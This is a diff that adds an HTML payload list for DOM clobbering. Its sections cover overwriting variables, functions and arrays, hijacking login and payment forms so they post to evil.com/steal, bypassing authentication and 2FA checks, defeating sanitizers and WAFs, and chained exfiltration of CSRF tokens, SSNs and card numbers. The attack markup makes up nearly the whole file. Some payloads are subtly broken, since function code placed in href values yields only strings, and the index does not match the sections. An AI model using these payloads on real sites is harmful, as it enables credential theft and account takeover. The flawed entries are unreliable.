@@ -1,0 +1,432 @@
+<!--
+DOM CLOBBERING - COMPLETE PAYLOAD LIST
+-->
+
+Index
+[1] Basic DOM Clobbering
+[2] Variable Overwrite
+[3] Function Overwrite
+[4] Array Overwrite
+[5] Form Hijacking
+[6] Anchor/Link Manipulation
+[7] Iframe Clobbering
+[8] Input/Form Element Clobbering
+[9] Prototype Pollution via DOM Clobbering
+[10] Security Check Bypass
+[11] XSS via DOM Clobbering
+[12] Sanitizer Bypass
+[13] JavaScript Framework Clobbering
+[14] Advanced Chained Payloads
+[15] WAF Bypass Techniques
+
+
+HOW IT WORKS:
+=============
+<a id="variableName"></a>  ->  window.variableName = <a> element
+<input name="functionName"> ->  window.functionName = <input> element
+
+<!--
+[1] BASIC DOM CLOBBERING
+-->
+
+<a id="username"></a>
+<div id="username"></div>
+<span name="username"></span>
+<a id="user" name="isAdmin" href="true"></a>
+<img id="user" name="role" value="admin">
+<a id="admin"></a>
+<a id="admin" name="flag" href="true"></a>
+<input id="admin" name="level" value="super">
+<a id="config"></a>
+<a id="config" name="apiUrl" href="https://evil.com"></a>
+<div id="settings"></div>
+<span id="globalVar"></span>
+
+<!--
+[2] VARIABLE OVERWRITE
+-->
+
+<a id="isAdmin"></a>
+<a id="authenticated"></a>
+<a id="debugMode"></a>
+<a id="debugMode" href=""></a>
+<input id="apiKey" value="">
+<a id="apiKey"></a>
+<span id="portNumber"></span>
+<div id="allowedOrigins"></div>
+<a id="allowedOrigins" name="0" href="https://evil.com"></a>
+<a id="config"></a>
+<a id="config" name="api" href="https://evil.com"></a>
+<a id="config" name="timeout" href="0"></a>
+<a id="sessionToken"></a>
+<a id="csrfToken"></a>
+<a id="userRole"></a>
+<a id="accessLevel"></a>
+
+<!--
+[3] FUNCTION OVERWRITE
+-->
+
+<a id="sanitize"></a>
+<a id="escapeHtml"></a>
+<a id="validateInput"></a>
+<a id="csrfToken"></a>
+<a id="JSON"></a>
+<a id="JSON" name="parse" href="javascript:alert(1)"></a>
+<a id="console"></a>
+<a id="console" name="log"></a>
+<a id="window"></a>
+<a id="document"></a>
+<a id="eval"></a>
+<a id="Function"></a>
+<a id="setTimeout"></a>
+<a id="setInterval"></a>
+<a id="addEventListener"></a>
+<a id="getElementById"></a>
+<a id="querySelector"></a>
+
+<!--
+[4] ARRAY OVERWRITE
+-->
+
+<a id="whitelist"></a>
+<a id="blacklist"></a>
+<a id="allowedDomains"></a>
+<a id="allowedDomains" name="0" href="evil.com"></a>
+<a id="allowedDomains" name="1" href="evil.com"></a>
+<a id="allowedDomains" name="length" href="2"></a>
+<a id="whitelist" name="length" href="0"></a>
+<a id="blacklist" name="0" href="safe.com"></a>
+<a id="blacklist" name="1" href="trusted.com"></a>
+<a id="Array"></a>
+<a id="Array" name="prototype"></a>
+<a id="Array" name="prototype.includes" href="function(){return true}"></a>
+<a id="permittedUrls"></a>
+<a id="corsOrigins"></a>
+<a id="corsOrigins" name="0" href="*"></a>
+
+<!--
+[5] FORM HIJACKING
+-->
+
+<form id="loginForm" action="https://evil.com/steal"></form>
+<form id="paymentForm" action="https://evil.com/steal"></form>
+<form name="login" action="https://evil.com/steal"></form>
+<form id="searchForm" method="GET" action="https://evil.com/steal"></form>
+<form id="loginForm">
+    <input name="username" value="">
+    <input name="password" value="">
+</form>
+<a id="loginForm" name="onsubmit" href="javascript:stealData()"></a>
+<form id="contactForm" action="javascript:alert(1)"></form>
+<form id="uploadForm" action="https://evil.com/steal" enctype="multipart/form-data"></form>
+<form id="signupForm" target="_blank" action="https://evil.com/phish"></form>
+
+<!--
+[6] ANCHOR/LINK MANIPULATION
+-->
+
+<a id="next" href="https://evil.com"></a>
+<a id="continueLink" href="javascript:alert(1)"></a>
+<a id="continueLink" href="https://evil.com"></a>
+<a id="downloadLink" href="https://evil.com/malware.exe" download></a>
+<a id="externalLink" target="_blank" href="https://evil.com"></a>
+<a id="redirectUrl" href="https://evil.com"></a>
+<a id="returnUrl" href="https://evil.com"></a>
+<a id="callbackUrl" href="https://evil.com"></a>
+<a id="links" name="0" href="https://evil.com"></a>
+<a id="links" name="1" href="https://evil2.com"></a>
+<a id="pagelink" href="data:text/html,<script>alert(1)</script>"></a>
+
+<!--
+[7] IFRAME CLOBBERING
+-->
+
+<iframe id="sandbox" src="https://evil.com"></iframe>
+<iframe id="player" src="https://evil.com/malicious.html"></iframe>
+<iframe name="player" src="javascript:alert(1)"></iframe>
+<iframe id="apiFrame" srcdoc="<script>window.parent.isAdmin=true</script>"></iframe>
+<iframe id="parent" srcdoc="<iframe id='child' src='evil.html'>"></iframe>
+<iframe id="securityCheck" src="about:blank"></iframe>
+<iframe name="postMessageTarget" src="https://evil.com"></iframe>
+<iframe id="contentFrame" srcdoc="<script>window.top.authenticated=false</script>"></iframe>
+<iframe id="sameOrigin" src="https://target.com/evil.html"></iframe>
+
+<!--
+[8] INPUT/FORM ELEMENT CLOBBERING
+-->
+
+<input id="csrf_token" value="evil_token">
+<input name="authenticity_token" value="hacked">
+<input id="password" value="">
+<input name="creditCard" value="">
+<input id="apiKey" value="evil">
+<input name="secret" value="stolen">
+<input id="adminCheck" value="true">
+<input name="role" value="superadmin">
+<input id="isAdmin" value="1">
+<input name="bypassAuth" value="true">
+<input id="token" value="attacker_token">
+<input name="verificationCode" value="0000">
+
+<!--
+[9] PROTOTYPE POLLUTION VIA DOM CLOBBERING
+-->
+
+<a id="__proto__"></a>
+<a id="__proto__" href="evil"></a>
+<a id="constructor"></a>
+<a id="constructor" name="prototype"></a>
+<a id="prototype"></a>
+<a id="prototype" name="isAdmin" href="true"></a>
+<a id="Object"></a>
+<a id="Object" name="prototype"></a>
+<a id="Object" name="prototype.isAdmin" href="true"></a>
+<a id="__proto__" name="polluted" href="true"></a>
+<a id="constructor" name="prototype.isAdmin" href="1"></a>
+
+<!--
+[10] SECURITY CHECK BYPASS
+-->
+
+<a id="authenticated"></a>
+<a id="loggedIn"></a>
+<a id="hasAccess"></a>
+<a id="isValidUser"></a>
+<a id="authorized"></a>
+<a id="verified"></a>
+<a id="bypassAuth"></a>
+<a id="requireAuth"></a>
+<a id="checkAuth"></a>
+<a id="validateSession"></a>
+<a id="isTrusted"></a>
+<a id="twoFactorEnabled"></a>
+<a id="emailVerified"></a>
+<a id="phoneVerified"></a>
+<a id="captchaValid"></a>
+<a id="recaptchaResponse"></a>
+
+<!--
+[11] XSS VIA DOM CLOBBERING
+-->
+
+<a id="innerHTML" href="javascript:alert(1)"></a>
+<a id="outerHTML" href="javascript:alert(1)"></a>
+<a id="textContent" href="javascript:alert(1)"></a>
+<a id="src" href="javascript:alert(1)"></a>
+<a id="data" href="javascript:alert(1)"></a>
+<a id="onclick" href="javascript:alert(1)"></a>
+<a id="onload" href="javascript:alert(1)"></a>
+<a id="onerror" href="javascript:alert(1)"></a>
+<a id="onmouseover" href="javascript:alert(1)"></a>
+<a id="onfocus" href="javascript:alert(1)"></a>
+<a id="location" href="javascript:alert(1)"></a>
+<a id="document" href="javascript:alert(1)"></a>
+<a id="window" href="javascript:alert(1)"></a>
+
+<!--
+[12] SANITIZER BYPASS
+-->
+
+<a id="DOMPurify"></a>
+<a id="DOMPurify" name="sanitize" href="function(x){return x}"></a>
+<a id="sanitizeHtml"></a>
+<a id="escapeHtml"></a>
+<a id="filterXSS"></a>
+<a id="xss"></a>
+<a id="xss" name="filter" href="function(x){return x}"></a>
+<a id="allowedTags"></a>
+<a id="allowedTags" name="0" href="script"></a>
+<a id="allowedTags" name="1" href="img"></a>
+<a id="allowedTags" name="length" href="0"></a>
+<a id="allowedAttributes"></a>
+<a id="allowedAttributes" name="0" href="onerror"></a>
+
+<!--
+[13] JAVASCRIPT FRAMEWORK CLOBBERING
+-->
+
+<!-- Angular -->
+<a id="angular"></a>
+<a id="$scope"></a>
+<a id="$rootScope"></a>
+<a id="ngModel"></a>
+
+<!-- React -->
+<a id="React"></a>
+<a id="ReactDOM"></a>
+<a id="__REACT_DEVTOOLS_GLOBAL_HOOK__"></a>
+<a id="_reactRootContainer"></a>
+
+<!-- Vue -->
+<a id="Vue"></a>
+<a id="__VUE__"></a>
+<a id="$vm"></a>
+
+<!-- jQuery -->
+<a id="jQuery"></a>
+<a id="$"></a>
+<a id="jQuery" name="globalEval" href="javascript:alert(1)"></a>
+
+<!-- Common libraries -->
+<a id="_"></a>
+<a id="lodash"></a>
+<a id="moment"></a>
+<a id="axios"></a>
+<a id="fetch"></a>
+
+<!--
+[14] ADVANCED CHAINED PAYLOADS
+-->
+
+<!-- Chain 1: Form + Iframe + Redirect -->
+<form id="loginForm" target="hiddenFrame" action="https://evil.com/steal"></form>
+<iframe id="hiddenFrame" name="hiddenFrame" style="display:none"></iframe>
+<a id="loginForm" name="submit" href="javascript:void(0)"></a>
+
+<!-- Chain 2: Array + Function clobber -->
+<a id="sanitizers"></a>
+<a id="sanitizers" name="0" href="javascript:alert(1)"></a>
+<a id="sanitizers" name="length" href="1"></a>
+
+<!-- Chain 3: Multiple variable clobber -->
+<a id="isAdmin"></a>
+<a id="isAdmin" name="toString" href="function(){return true}"></a>
+<a id="authenticated"></a>
+<a id="bypassAuth"></a>
+
+<!-- Chain 4: Prototype pollution + XSS -->
+<a id="__proto__"></a>
+<a id="__proto__" name="innerHTML" href="<img src=x onerror=alert(1)>"></a>
+<a id="constructor"></a>
+<a id="constructor" name="prototype"></a>
+
+<!-- Chain 5: Full authentication bypass -->
+<a id="user"></a>
+<a id="user" name="isAdmin" href="true"></a>
+<a id="user" name="role" href="admin"></a>
+<a id="user" name="permissions" href="*"></a>
+<form id="loginForm" action="/admin/panel"></form>
+
+<!-- Chain 6: Data exfiltration -->
+<form id="profileForm" action="https://evil.com/steal">
+    <input name="email" value="victim@target.com">
+    <input name="ssn" value="123-45-6789">
+    <input name="creditCard" value="4111-1111-1111-1111">
+</form>
+<a id="profileForm" name="submit" href="javascript:void(0)"></a>
+
+<!--
+[15] WAF BYPASS TECHNIQUES
+-->
+
+<!-- Using different HTML tags -->
+<div id="variableName"></div>
+<span id="variableName"></span>
+<p id="variableName"></p>
+<h1 id="variableName"></h1>
+<section id="variableName"></section>
+<article id="variableName"></article>
+<main id="variableName"></main>
+
+<!-- Using name attribute instead of id -->
+<a name="variableName"></a>
+<input name="variableName">
+<img name="variableName">
+<form name="variableName">
+<iframe name="variableName">
+
+<!-- Multiple elements with same id -->
+<a id="target"></a>
+<a id="target"></a>
+<a id="target"></a>
+
+<!-- Nested elements -->
+<div id="parent">
+    <div id="child"></div>
+</div>
+<div id="parent" name="child"></div>
+
+<!-- Using HTML5 tags -->
+<details id="variableName"></details>
+<summary id="variableName"></summary>
+<dialog id="variableName"></dialog>
+<menu id="variableName"></menu>
+
+<!-- SVG tags -->
+<svg id="variableName"></svg>
+<path id="variableName"></path>
+<circle id="variableName"></circle>
+
+<!-- Style manipulation -->
+<style id="variableName"></style>
+<link id="variableName">
+
+<!-- Meta tags -->
+<meta id="variableName">
+<meta name="variableName">
+
+<!--
+[16] EXPLOIT SCENARIO PAYLOADS
+-->
+
+<!-- Scenario 1: Steal CSRF token via form hijack -->
+<form id="csrfForm" action="https://evil.com/steal">
+    <input name="csrf_token" value="__REAL_TOKEN__">
+</form>
+<a id="csrfForm" name="submit" href="javascript:void(0)"></a>
+
+<!-- Scenario 2: Bypass 2FA -->
+<a id="twoFactorEnabled"></a>
+<a id="require2FA"></a>
+<a id="twoFactorVerified"></a>
+<form id="verifyForm" action="/dashboard"></form>
+
+<!-- Scenario 3: Privilege escalation -->
+<a id="currentUser"></a>
+<a id="currentUser" name="role" href="admin"></a>
+<a id="currentUser" name="permissions" href="*"></a>
+<a id="userLevel" href="0"></a>
+
+<!-- Scenario 4: DOM XSS via innerHTML clobber -->
+<div id="output"></div>
+<a id="output" name="innerHTML" href="<img src=x onerror=alert(1)>"></a>
+<script>
+    document.getElementById("output").innerHTML = userInput;
+</script>
+
+<!-- Scenario 5: Redirect to phishing page -->
+<a id="redirectUrl" href="https://evil-phishing.com"></a>
+<a id="returnTo" href="https://evil-phishing.com"></a>
+<a id="nextPage" href="https://evil-phishing.com"></a>
+
+<!--
+[17] TESTING & DETECTION PAYLOADS
+-->
+
+<!-- Test if clobbering works -->
+<a id="testClobber"></a>
+<script>
+    if (window.testClobber === undefined) {
+        console.log("No clobbering");
+    } else {
+        console.log("Clobbering works!");
+    }
+</script>
+
+<!-- Detect variable type after clobbering -->
+<a id="targetVar"></a>
+<script>
+    console.log(typeof window.targetVar);  // Should be "object" not "undefined"
+    console.log(window.targetVar instanceof HTMLElement);  // Should be true
+</script>
+
+<!-- Enumerate all clobbered variables -->
+<script>
+    for (var prop in window) {
+        if (window[prop] instanceof HTMLElement) {
+            console.log("Clobbered: " + prop);
+        }
+    }
+</script>
+
